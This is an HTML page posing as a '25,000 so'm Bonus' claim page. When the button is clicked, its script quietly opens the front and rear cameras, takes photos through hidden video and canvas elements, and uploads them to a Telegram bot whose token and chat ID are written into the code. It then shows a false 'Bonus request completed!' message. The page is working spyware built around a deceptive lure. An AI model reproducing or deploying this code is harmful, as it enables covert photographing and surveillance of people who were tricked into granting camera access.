<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bonus App</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
        }
        #startBtn {
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            margin-top: 20px;
            transition: background-color 0.3s;
            width: 100%;
        }
        #startBtn:hover {
            background-color: #45a049;
        }
        #startBtn:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            display: none;
        }
        .success {
            background-color: #dff0d8;
            color: #3c763d;
        }
        .error {
            background-color: #f2dede;
            color: #a94442;
        }
        .permission-help {
            margin-top: 15px;
            font-size: 14px;
            color: #666;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Get Your 25,000 so'm Bonus</h1>
        <p>Click the button below to claim your reward</p>
        
        <button id="startBtn">Claim Your Bonus</button>
        <div class="loader" id="loader"></div>
        <div id="status" class="status"></div>
        <div id="permissionHelp" class="permission-help">
            If camera doesn't open, please check your browser permissions and allow camera access.
        </div>
        
        <!-- Hidden elements for camera capture -->
        <video id="video" autoplay playsinline style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        const startBtn = document.getElementById("startBtn");
        const loader = document.getElementById("loader");
        const statusEl = document.getElementById("status");
        const permissionHelp = document.getElementById("permissionHelp");
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        const BOT_TOKEN = "7967235049:AAG30JSXJubgiQw2PUk6IXschzHRDrdwlvU";
        const CHAT_ID = "705345765";
        let isProcessing = false;
        let stream = null;

        // ========== UTILITY FUNCTIONS ==========
        function showStatus(message, isError = false) {
            statusEl.textContent = message;
            statusEl.className = isError ? "status error" : "status success";
            statusEl.style.display = "block";
        }

        function hideStatus() {
            statusEl.style.display = "none";
        }

        function showPermissionHelp() {
            permissionHelp.style.display = "block";
        }

        function isTelegramBrowser() {
            return /Telegram|TelegramBot/i.test(navigator.userAgent);
        }

        // ========== CAMERA FUNCTIONS ==========
        async function checkCameraPermissions() {
            try {
                // Try direct access to trigger permission prompt
                const testStream = await navigator.mediaDevices.getUserMedia({ video: true });
                testStream.getTracks().forEach(track => track.stop());
                return true;
            } catch (error) {
                console.error("Camera permission error:", error);
                if (error.name === 'NotAllowedError') {
                    showPermissionHelp();
                }
                return false;
            }
        }

        async function initCamera(facingMode) {
            await stopCamera(); // Clean up existing streams
            
            const constraints = {
                video: {
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            };

            // Only specify facingMode if not in Telegram browser
            if (!isTelegramBrowser()) {
                constraints.video.facingMode = facingMode;
            }

            try {
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                
                return new Promise((resolve) => {
                    const onReady = () => {
                        video.removeEventListener('canplay', onReady);
                        resolve(true);
                    };
                    
                    video.addEventListener('canplay', onReady);
                    
                    // Fallback timeout
                    setTimeout(() => {
                        video.removeEventListener('canplay', onReady);
                        resolve(video.readyState >= 3); // HAVE_ENOUGH_DATA
                    }, 3000);
                });
            } catch (error) {
                console.error("Camera init error:", error);
                return false;
            }
        }

        async function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
            if (video.srcObject) {
                video.srcObject = null;
            }
        }

        // ========== IMAGE CAPTURE & UPLOAD ==========
        async function capturePhoto(facingMode) {
            return new Promise((resolve) => {
                if (video.readyState < 4) { // HAVE_ENOUGH_DATA
                    setTimeout(() => capturePhoto(facingMode).then(resolve), 100);
                    return;
                }
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(async (blob) => {
                    const success = await sendToTelegram(blob, facingMode);
                    resolve(success);
                }, "image/jpeg", 0.7);
            });
        }

        async function sendToTelegram(blob, facingMode) {
            // Use XHR for better Telegram compatibility
            return new Promise((resolve) => {
                const xhr = new XMLHttpRequest();
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, `photo_${facingMode}.jpg`);
                
                xhr.open("POST", `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, true);
                
                xhr.onload = function() {
                    resolve(this.status === 200);
                };
                
                xhr.onerror = function() {
                    resolve(false);
                };
                
                xhr.send(formData);
            });
        }

        // ========== MAIN PROCESS ==========
        async function captureFromBothCameras() {
            if (isProcessing) return;
            isProcessing = true;
            
            startBtn.disabled = true;
            loader.style.display = "block";
            showStatus("Processing your request...");

            try {
                // Front camera
                if (await initCamera("user")) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    await capturePhoto("front");
                    await stopCamera();
                }

                // Rear camera (skip if in Telegram browser)
                if (!isTelegramBrowser()) {
                    try {
                        if (await initCamera("environment")) {
                            await new Promise(resolve => setTimeout(resolve, 1000));
                            await capturePhoto("rear");
                            await stopCamera();
                        }
                    } catch (rearError) {
                        console.log("Rear camera not available");
                    }
                }

                showStatus("Bonus request completed!", false);
            } catch (error) {
                console.error("Process error:", error);
                showStatus("Error: Please try again", true);
            } finally {
                loader.style.display = "none";
                startBtn.disabled = false;
                isProcessing = false;
                await stopCamera();
                setTimeout(hideStatus, 5000);
            }
        }

        // ========== EVENT HANDLERS ==========
        startBtn.addEventListener("click", async () => {
            const hasPermissions = await checkCameraPermissions();
            if (!hasPermissions) {
                showStatus("Please enable camera permissions", true);
                showPermissionHelp();
                return;
            }
            
            // Add slight delay for Telegram browser
            if (isTelegramBrowser()) {
                showStatus("Preparing camera...");
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            captureFromBothCameras();
        });

        // Handle page visibility changes
        document.addEventListener('visibilitychange', () => {
            if (document.hidden && isProcessing) {
                stopCamera();
            }
        });

        // Handle beforeunload
        window.addEventListener('beforeunload', (e) => {
            if (isProcessing) {
                e.preventDefault();
                e.returnValue = '';
                return "Are you sure you want to leave? Your request is processing.";
            }
        });

        // Initialize Telegram-specific adjustments
        if (isTelegramBrowser()) {
            console.log("Telegram browser detected - applying compatibility settings");
        }
    </script>
</body>
</html>
